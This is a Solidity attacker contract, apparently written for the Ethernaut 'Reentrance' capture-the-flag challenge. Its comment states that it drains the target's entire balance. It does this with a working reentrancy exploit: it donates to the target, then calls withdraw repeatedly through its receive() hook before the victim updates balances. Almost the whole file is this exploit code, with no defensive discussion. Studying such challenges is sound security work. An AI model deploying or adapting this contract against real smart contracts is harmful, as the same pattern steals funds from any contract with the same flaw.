// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

/// @title Reentrance challenge attacker contract 
/// @notice This contract is calling Reentrance contract performing a re-entrancy attack, due to
/// the missing check-effect-interaction pattern in its withdraw function. Balances mapping never
/// gets to be updated and our receive() keeps the cyclic calls to steal all contract balance. 

contract ReentranceAttack {

    uint initialFund;
    Reentrance reentranceContract;

    constructor(address payable _address) public{
        reentranceContract = Reentrance(_address);
    }
    
    function fund() payable public{
        initialFund = msg.value;
        reentranceContract.donate{value: initialFund}(address(this));
    }

    function withdraw() public {

        uint bal = address(reentranceContract).balance;

        if(bal > 0 ){
            if(bal >= initialFund){
                reentranceContract.withdraw(initialFund); 

            }else{
            reentranceContract.withdraw(bal);
            }
        }
    }

    receive() external payable{
        withdraw();
        
    }

}